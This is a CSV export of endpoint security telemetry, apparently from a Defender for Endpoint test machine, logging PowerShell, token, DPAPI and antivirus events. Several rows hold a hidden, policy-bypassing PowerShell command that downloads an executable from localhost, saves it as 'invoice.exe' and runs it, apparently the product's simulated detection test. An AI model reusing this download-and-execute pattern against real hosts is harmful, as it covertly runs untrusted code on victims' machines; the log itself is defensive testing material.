Timestamp,DeviceId,DeviceName,ActionType,FileName,FolderPath,SHA1,SHA256,MD5,FileSize,AccountDomain,AccountName,AccountSid,RemoteUrl,ProcessId,ProcessCommandLine,ProcessCreationTime,ProcessTokenElevation,LogonId,LocalIP,LocalPort,FileOriginUrl,FileOriginIP,InitiatingProcessSHA1,InitiatingProcessSHA256,InitiatingProcessMD5,InitiatingProcessFileName,InitiatingProcessFileSize,InitiatingProcessFolderPath,InitiatingProcessId,InitiatingProcessCommandLine,InitiatingProcessCreationTime,InitiatingProcessAccountDomain,InitiatingProcessAccountName,InitiatingProcessAccountSid,InitiatingProcessVersionInfoCompanyName,InitiatingProcessVersionInfoProductName,InitiatingProcessVersionInfoProductVersion,InitiatingProcessVersionInfoInternalFileName,InitiatingProcessVersionInfoOriginalFileName,InitiatingProcessVersionInfoFileDescription,InitiatingProcessParentId,InitiatingProcessParentFileName,InitiatingProcessParentCreationTime,InitiatingProcessLogonId,ReportId,AdditionalFields,InitiatingProcessSessionId,IsInitiatingProcessRemoteSession,InitiatingProcessRemoteSessionIP,CreatedProcessSessionId,IsProcessRemoteSession,ProcessRemoteSessionDeviceName,ProcessRemoteSessionIP,InitiatingProcessUniqueId
"Oct 9, 2024 3:55:50 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,PnpDeviceConnected,,,,,,,,,,,,,Invalid date,,,,,,,,,,,,,,,Invalid date,workgroup,dc01$,S-1-5-18,,,,,,,,,Invalid date,999,4434,"{""ClassName"":""Monitor"",""ClassId"":""4d36e96e-e325-11ce-bfc1-08002be10318"",""DeviceId"":""DISPLAY\\Default_Monitor\\1&1f0c3c2f&0&UID256"",""DeviceDescription"":""Generic Non-PnP Monitor"",""VendorIds"":[""MONITOR\\Default_Monitor""]}",,0,,,0,,,
"Oct 9, 2024 3:55:50 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,BrowserLaunchedToOpenUrl,,,,,,,,,,Microsoft Edge.lnk,,,Invalid date,,,,,,,4490732cbe530d9f0d52bae029444b50e1cb5057,b5050e0661db175ca19cec51930637184cb01c8c6683633aee168d56f273ac08,ce1e7afe7a17be31473db3cb84d4e806,explorer.exe,4839992,c:\windows\explorer.exe,6016,Explorer.EXE,"Oct 9, 2024 2:47:54 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2582,explorer,EXPLORER.EXE,Windows Explorer,6000,userinit.exe,"Oct 9, 2024 2:47:54 PM",0,4457,{},2,1,10.46.20.243,,0,,,2814749767106764
"Oct 9, 2024 3:55:52 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,PnpDeviceAllowed,,,,,,,,,,,,,Invalid date,,,,,,,,,,,,,0,,Invalid date,,,,,,,,,,0,,Invalid date,0,4466,"{""ClassGuid"":""1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc"",""DeviceInstanceId"":""SWD\\PRINTENUM\\{483C4B68-1FBC-4C41-BE15-64589A224EC0}"",""DeviceUpdated"":false,""DriverDate"":""06/21/2006"",""DriverInbox"":true,""DriverName"":""printqueue.inf"",""DriverProvider"":""Microsoft"",""DriverSection"":""NO_DRV_LOCAL"",""DriverVersion"":""10.0.20348.1"",""MatchingDeviceId"":""PRINTENUM\\LocalPrintQueue"",""OutrankedDrivers"":""oem9.inf:{084f01fa-e634-4d77-83ee-074817c03581}:00FF0002 c_swdevice.inf:SWD\\GenericRaw:00FF3001"",""ParentDeviceInstanceId"":""SWD\\PRINTENUM\\PrintQueues""}",,0,,,0,,,0
"Oct 9, 2024 3:55:52 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,PnpDeviceConnected,,,,,,,,,,,,,Invalid date,,,,,,,,,,,,,,,Invalid date,workgroup,dc01$,S-1-5-18,,,,,,,,,Invalid date,999,4465,"{""ClassName"":""PrintQueue"",""ClassId"":""1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc"",""DeviceId"":""SWD\\PRINTENUM\\{483C4B68-1FBC-4C41-BE15-64589A224EC0}"",""DeviceDescription"":""Microsoft Print to PDF (redirected 2)"",""VendorIds"":[""PRINTENUM\\{084f01fa-e634-4d77-83ee-074817c03581}"",""PRINTENUM\\LocalPrintQueue"",""{084f01fa-e634-4d77-83ee-074817c03581}""]}",,0,,,0,,,
"Oct 9, 2024 3:55:56 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,DpapiAccessed,,,,,,157,,,,,,,Invalid date,,,,,,,92753a0410d27297fe7090f6dae80dfd02f8c545,1f44b6b12ed835b8332bbbe45190ef3ba274f0c48d59405cc13571370040f354,d26e0d98d0a7e23802b1f4caecb9d3d8,searchapp.exe,3363184,c:\windows\systemapps\microsoft.windows.search_cw5n1h2txyewy\searchapp.exe,6432,"""SearchApp.exe"" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca","Oct 9, 2024 2:47:57 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2520,SearchApp,SearchApp.exe,Search application,892,svchost.exe,"Oct 9, 2024 2:45:40 PM",0,4470,"{""CallerProcessID"":6432,""Flags"":""CRYPTPROTECT_UI_FORBIDDEN"",""MasterKeyGUID"":""87af8ed8-de85-424a-ba62-4ecde291bf4a"",""OperationType"":""SPCryptProtect"",""ReturnValue"":0}",2,1,10.46.20.243,,0,,,2814749767106772
"Oct 9, 2024 3:56:12 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,AntivirusReport,amsistream-56E8D0F5DEA6757FEF41AFD43828E1C8,,407586e9fc08d7f8761ace69ceb32a6c48dcf842,,b8b427ce74c8d465933c4bcd59029784,,,,,,,,Invalid date,,,,,,,,,,,,,,,Invalid date,,,,,,,,,,,,Invalid date,,1818271862,"{""WasExecutingWhileDetected"":false}",,0,,,0,,,
"Oct 9, 2024 3:56:13 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,PowerShellCommand,,,,,,,,,,,,,Invalid date,,,,,,,a2d8d23854e33984c08dcf8b03edc619c9c5ec69,75d6634a676fb0bea5bfd8d424e2bd4f685f3885853637ea143b2671a3bb76e9,0bc8a4cd1e07390bafd741e1fc0399a3,powershell.exe,450560,c:\windows\system32\windowspowershell\v1.0\powershell.exe,3708,"""powershell.exe"" -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden Continue= silentlycontinue","Oct 9, 2024 3:56:12 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,9152,powershell.exe,"Oct 9, 2024 2:58:04 PM",719343,4498,"{""Command"":""prompt""}",2,1,10.46.20.243,,0,,,2814749767107150
"Oct 9, 2024 3:56:13 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,PowerShellCommand,,,,,,,,,,,,,Invalid date,,,,,,,a2d8d23854e33984c08dcf8b03edc619c9c5ec69,75d6634a676fb0bea5bfd8d424e2bd4f685f3885853637ea143b2671a3bb76e9,0bc8a4cd1e07390bafd741e1fc0399a3,powershell.exe,450560,c:\windows\system32\windowspowershell\v1.0\powershell.exe,3708,"""powershell.exe"" -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden Continue= silentlycontinue","Oct 9, 2024 3:56:12 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,9152,powershell.exe,"Oct 9, 2024 2:58:04 PM",719343,4499,"{""Command"":""PSConsoleHostReadLine""}",2,1,10.46.20.243,,0,,,2814749767107150
"Oct 9, 2024 3:56:18 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,BrowserLaunchedToOpenUrl,,,,,,,,,,C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Administrative Tools\Server Manager.lnk,,,Invalid date,,,,,,,4490732cbe530d9f0d52bae029444b50e1cb5057,b5050e0661db175ca19cec51930637184cb01c8c6683633aee168d56f273ac08,ce1e7afe7a17be31473db3cb84d4e806,explorer.exe,4839992,c:\windows\explorer.exe,6016,Explorer.EXE,"Oct 9, 2024 2:47:54 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2582,explorer,EXPLORER.EXE,Windows Explorer,6000,userinit.exe,"Oct 9, 2024 2:47:54 PM",0,4500,{},2,1,10.46.20.243,,0,,,2814749767106764
"Oct 9, 2024 3:58:02 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,DpapiAccessed,,,,,,960,,,,,,,Invalid date,,,,,,,746df898e76cc19408f99d2be0a63fdb57d391f8,0c2f7b5af2bec3791f7e81f7d89b7f292e501a0bd56528bcaa9a9bed5376f3ce,73e34280775cbb20afb16477b0afdba7,smartscreen.exe,2564096,c:\windows\system32\smartscreen.exe,4508,smartscreen.exe -Embedding,"Oct 9, 2024 3:56:11 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2652,smartscreen.exe,smartscreen.exe,Windows Defender SmartScreen,892,svchost.exe,"Oct 9, 2024 2:45:40 PM",719343,4504,"{""CallerProcessID"":4508,""Flags"":""CRYPTPROTECT_UI_FORBIDDEN"",""MasterKeyGUID"":""87af8ed8-de85-424a-ba62-4ecde291bf4a"",""OperationType"":""SPCryptUnprotect"",""ReturnValue"":0}",2,1,10.46.20.243,,0,,,2814749767107148
"Oct 9, 2024 3:58:02 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,BrowserLaunchedToOpenUrl,,,,,,,,,,C:\Users\alice\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell (x86).lnk,,,Invalid date,,,,,,,4490732cbe530d9f0d52bae029444b50e1cb5057,b5050e0661db175ca19cec51930637184cb01c8c6683633aee168d56f273ac08,ce1e7afe7a17be31473db3cb84d4e806,explorer.exe,4839992,c:\windows\explorer.exe,6016,Explorer.EXE,"Oct 9, 2024 2:47:54 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2582,explorer,EXPLORER.EXE,Windows Explorer,6000,userinit.exe,"Oct 9, 2024 2:47:54 PM",0,4505,{},2,1,10.46.20.243,,0,,,2814749767106764
"Oct 9, 2024 3:58:02 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,BrowserLaunchedToOpenUrl,,,,,,,,,,C:\Users\alice\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell (x86).lnk,,,Invalid date,,,,,,,16e64043c60112957a1f8c9ffb3eb463a60058a0,b30426f225c10993891e33fb189714e1b9dfc1f45919a05a1e0a9db4313497e4,a0d79d2144d0fce3671b4aca5f1cf395,conhost.exe,987136,c:\windows\system32\conhost.exe,2788,conhost.exe 0xffffffff -ForceV1,"Oct 9, 2024 3:58:02 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2520,ConHost,CONHOST.EXE,Console Window Host,8552,powershell.exe,"Oct 9, 2024 3:58:02 PM",0,4506,{},2,1,10.46.20.243,,0,,,2814749767107153
"Oct 9, 2024 3:58:03 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,BrowserLaunchedToOpenUrl,,,,,,,,,,C:\Users\alice\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell (x86).lnk,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe,8552,"""powershell.exe"" ","Oct 9, 2024 3:58:02 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,6016,explorer.exe,"Oct 9, 2024 2:47:54 PM",0,4509,{},2,1,10.46.20.243,,0,,,2814749767107152
"Oct 9, 2024 3:58:03 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,ProcessPrimaryTokenModified,,,,,,,,,,,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,C:\Windows\SysWOW64\WindowsPowerShell\v1.0,8552,"""powershell.exe"" ","Oct 9, 2024 3:58:02 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,6016,explorer.exe,"Oct 9, 2024 2:47:54 PM",0,4517,"{""TokenModificationProperties"":""{\""tokenChangeDescription\"":\""Privileges were added to the process token of an unknown process\"",\""privilegesFlags\"":[],\""isChangedToSystemToken\"":false,\""originalTokenIntegrityLevelName\"":\""High\"",\""currentTokenIntegrityLevelName\"":\""High\""}"",""SystemTokenPointer"":""18446670970133063584"",""OriginalTokenIntegrityLevel"":""12288"",""OriginalTokenPointer"":""18446670970328176304"",""OriginalTokenPrivEnabled"":""1619001344"",""OriginalTokenPrivPresent"":""130793013024"",""OriginalTokenSource"":""VXNlcjMyIAA="",""OriginalTokenUserSid"":""S-1-5-21-827617619-716324038-3096087224-500"",""CurrentTokenIntegrityLevel"":""12288"",""CurrentTokenPointer"":""18446670970328176304"",""CurrentTokenPrivEnabled"":""1620049920"",""CurrentTokenSource"":""VXNlcjMyIAA="",""CurrentTokenUserSid"":""S-1-5-21-827617619-716324038-3096087224-500""}",2,1,10.46.20.243,,0,,,2814749767107152
"Oct 9, 2024 3:58:03 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,PowerShellCommand,,,,,,,,,,,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe,8552,"""powershell.exe"" ","Oct 9, 2024 3:58:02 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,6016,explorer.exe,"Oct 9, 2024 2:47:54 PM",0,4528,"{""Command"":""prompt""}",2,1,10.46.20.243,,0,,,2814749767107152
"Oct 9, 2024 3:58:03 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,PowerShellCommand,,,,,,,,,,,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe,8552,"""powershell.exe"" ","Oct 9, 2024 3:58:02 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,6016,explorer.exe,"Oct 9, 2024 2:47:54 PM",0,4529,"{""Command"":""PSConsoleHostReadLine""}",2,1,10.46.20.243,,0,,,2814749767107152
"Oct 9, 2024 3:58:10 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,PowerShellCommand,,,,,,,,,,,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe,8384,"""powershell.exe"" -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden Continue= silentlycontinue","Oct 9, 2024 3:58:04 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,8552,powershell.exe,"Oct 9, 2024 3:58:02 PM",719343,4554,"{""Command"":""prompt""}",2,1,10.46.20.243,,0,,,2814749767107154
"Oct 9, 2024 3:58:10 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,PowerShellCommand,,,,,,,,,,,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe,8384,"""powershell.exe"" -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden Continue= silentlycontinue","Oct 9, 2024 3:58:04 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,8552,powershell.exe,"Oct 9, 2024 3:58:02 PM",719343,4555,"{""Command"":""PSConsoleHostReadLine""}",2,1,10.46.20.243,,0,,,2814749767107154
"Oct 9, 2024 3:58:10 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,BrowserLaunchedToOpenUrl,,,,,,,,,,C:\Users\alice\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Command Prompt.lnk,,,Invalid date,,,,,,,4490732cbe530d9f0d52bae029444b50e1cb5057,b5050e0661db175ca19cec51930637184cb01c8c6683633aee168d56f273ac08,ce1e7afe7a17be31473db3cb84d4e806,explorer.exe,4839992,c:\windows\explorer.exe,6016,Explorer.EXE,"Oct 9, 2024 2:47:54 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2582,explorer,EXPLORER.EXE,Windows Explorer,6000,userinit.exe,"Oct 9, 2024 2:47:54 PM",0,4556,{},2,1,10.46.20.243,,0,,,2814749767106764
"Oct 9, 2024 3:58:10 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,BrowserLaunchedToOpenUrl,,,,,,,,,,C:\Users\alice\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Command Prompt.lnk,,,Invalid date,,,,,,,16e64043c60112957a1f8c9ffb3eb463a60058a0,b30426f225c10993891e33fb189714e1b9dfc1f45919a05a1e0a9db4313497e4,a0d79d2144d0fce3671b4aca5f1cf395,conhost.exe,987136,c:\windows\system32\conhost.exe,7784,conhost.exe 0xffffffff -ForceV1,"Oct 9, 2024 3:58:10 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2520,ConHost,CONHOST.EXE,Console Window Host,2384,cmd.exe,"Oct 9, 2024 3:58:10 PM",0,4557,{},2,1,10.46.20.243,,0,,,2814749767107159
"Oct 9, 2024 3:58:11 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,ProcessPrimaryTokenModified,,,,,,,,,,,,,Invalid date,,,,,,,a2d8d23854e33984c08dcf8b03edc619c9c5ec69,75d6634a676fb0bea5bfd8d424e2bd4f685f3885853637ea143b2671a3bb76e9,0bc8a4cd1e07390bafd741e1fc0399a3,powershell.exe,450560,C:\Windows\System32\WindowsPowerShell\v1.0,9112,"powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'","Oct 9, 2024 3:58:11 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,2384,cmd.exe,"Oct 9, 2024 3:58:10 PM",0,4564,"{""TokenModificationProperties"":""{\""tokenChangeDescription\"":\""Privileges were added to the process token of an unknown process\"",\""privilegesFlags\"":[],\""isChangedToSystemToken\"":false,\""originalTokenIntegrityLevelName\"":\""High\"",\""currentTokenIntegrityLevelName\"":\""High\""}"",""SystemTokenPointer"":""18446670970133063584"",""OriginalTokenIntegrityLevel"":""12288"",""OriginalTokenPointer"":""18446670970333966496"",""OriginalTokenPrivEnabled"":""1619001344"",""OriginalTokenPrivPresent"":""130793013024"",""OriginalTokenSource"":""VXNlcjMyIAA="",""OriginalTokenUserSid"":""S-1-5-21-827617619-716324038-3096087224-500"",""CurrentTokenIntegrityLevel"":""12288"",""CurrentTokenPointer"":""18446670970333966496"",""CurrentTokenPrivEnabled"":""1620049920"",""CurrentTokenSource"":""VXNlcjMyIAA="",""CurrentTokenUserSid"":""S-1-5-21-827617619-716324038-3096087224-500""}",2,1,10.46.20.243,,0,,,2814749767107160
"Oct 9, 2024 3:58:11 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,AntivirusReport,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,,,,,,,,,,,Invalid date,,,,,,,,,,,,,,,Invalid date,,,,,,,,,,,,Invalid date,,1744515432,"{""WasExecutingWhileDetected"":false}",,0,,,0,,,
"Oct 9, 2024 3:58:11 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,AntivirusReport,explorer.exe,C:\Windows,,,,,,,,,,,Invalid date,,,,,,,,,,,,,,,Invalid date,,,,,,,,,,,,Invalid date,,1744515424,"{""WasExecutingWhileDetected"":false}",,0,,,0,,,
"Oct 9, 2024 3:58:11 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,AntivirusReport,cmd.exe,C:\Windows\System32,,,,,,,,,,,Invalid date,,,,,,,,,,,,,,,Invalid date,,,,,,,,,,,,Invalid date,,1744515418,"{""WasExecutingWhileDetected"":false}",,0,,,0,,,
"Oct 9, 2024 3:58:11 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,PowerShellCommand,,,,,,,,,,,,,Invalid date,,,,,,,a2d8d23854e33984c08dcf8b03edc619c9c5ec69,75d6634a676fb0bea5bfd8d424e2bd4f685f3885853637ea143b2671a3bb76e9,0bc8a4cd1e07390bafd741e1fc0399a3,powershell.exe,450560,c:\windows\system32\windowspowershell\v1.0\powershell.exe,9112,"powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'","Oct 9, 2024 3:58:11 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,2384,cmd.exe,"Oct 9, 2024 3:58:10 PM",0,4573,"{""Command"":""prompt""}",2,1,10.46.20.243,,0,,,2814749767107160
"Oct 9, 2024 3:58:11 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,PowerShellCommand,,,,,,,,,,,,,Invalid date,,,,,,,a2d8d23854e33984c08dcf8b03edc619c9c5ec69,75d6634a676fb0bea5bfd8d424e2bd4f685f3885853637ea143b2671a3bb76e9,0bc8a4cd1e07390bafd741e1fc0399a3,powershell.exe,450560,c:\windows\system32\windowspowershell\v1.0\powershell.exe,9112,"powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'","Oct 9, 2024 3:58:11 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,2384,cmd.exe,"Oct 9, 2024 3:58:10 PM",0,4574,"{""Command"":""PSConsoleHostReadLine""}",2,1,10.46.20.243,,0,,,2814749767107160
"Oct 9, 2024 3:58:12 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,AntivirusReport,cmd.exe,C:\Windows\System32,,,,,,,,,,,Invalid date,,,,,,,,,,,,,,,Invalid date,,,,,,,,,,,,Invalid date,,1821085080,"{""WasExecutingWhileDetected"":false}",,0,,,0,,,
"Oct 9, 2024 3:58:12 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,AntivirusReport,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,,,,,,,,,,,Invalid date,,,,,,,,,,,,,,,Invalid date,,,,,,,,,,,,Invalid date,,1821085079,"{""WasExecutingWhileDetected"":false}",,0,,,0,,,
"Oct 9, 2024 3:58:26 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,CreateRemoteThreadApiCall,cmd.exe,C:\Windows\System32,3fbd42e2460c2eeb2dfe115a4468a2b954d24958,,503ee109ce5cac4bd61084cb28fbd200,331776,dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,,8952,"""cmd.exe"" ","Oct 9, 2024 3:58:14 PM",TokenElevationTypeDefault,,,,,,7821fb14835083bae87a66ce96b67b261bea6b2b,50cbdbce85014f1042f99d5acdaad88ff268317a605bc3700b2487edd0f2ef0e,a6c9ee45bff7c5e696b07ec41af84541,csrss.exe,37560,C:\Windows\System32,3008,"csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16","Oct 9, 2024 2:47:49 PM",nt authority,system,S-1-5-18,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.1,CSRSS.Exe,CSRSS.Exe,Client Server Runtime Process,2896,smss.exe,"Oct 9, 2024 2:47:49 PM",0,4586,"{""IntegrityLevel"":12288}",2,0,,2,1,TS-MF-01,10.46.20.243,2814749767106734
"Oct 9, 2024 3:58:50 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,BrowserLaunchedToOpenUrl,,,,,,,,,,C:\ProgramData\Microsoft\Windows\Start Menu\Programs\System Tools\Task Manager.lnk,,,Invalid date,,,,,,,4490732cbe530d9f0d52bae029444b50e1cb5057,b5050e0661db175ca19cec51930637184cb01c8c6683633aee168d56f273ac08,ce1e7afe7a17be31473db3cb84d4e806,explorer.exe,4839992,c:\windows\explorer.exe,6016,Explorer.EXE,"Oct 9, 2024 2:47:54 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2582,explorer,EXPLORER.EXE,Windows Explorer,6000,userinit.exe,"Oct 9, 2024 2:47:54 PM",0,4587,{},2,1,10.46.20.243,,0,,,2814749767106764
